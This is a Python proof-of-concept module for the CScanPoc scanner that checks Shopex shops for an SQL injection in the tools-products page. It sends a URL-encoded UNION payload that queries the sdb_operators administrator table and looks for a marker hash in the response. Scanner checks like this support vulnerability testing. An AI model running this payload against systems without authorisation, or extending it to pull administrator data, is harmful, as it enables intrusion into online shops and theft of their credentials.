# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time

class Vuln(ABVuln):
    poc_id = '729031dd-edff-4c13-9bfa-cfaf719e8b04'
    name = 'Shopex SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-03-10'  # 漏洞公布时间
    desc = '''
        Shopex /ctl_tools.php SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'Shopex'  # 漏洞应用名称
    product_version = '*'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '40d54715-cbd6-4c1e-98c7-3cb57ef98672'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-05'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            verify_url = self.target + '/?tools-products.html'
            payload = ("goods%3D1%2C2%22%29%20rank%2C%28SELECT%20concat%280x23%2Cmd5%283.1415%29"
                       "%2C0x23%29%20FROM%20sdb_operators%20limit%200%2C1%29%20as%20goods_id%2C"
                       "image_default%2Cthumbnail_pic%2Cbrief%2Cpdt_desc%2Cmktprice%2Cbig_pic%20"
                       "FROM%20sdb_goods%20limit%200%2C1%20%23")

            content = requests.post(verify_url, data=payload).content
            if '63e1f04640e83605c1d177544a5a0488' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
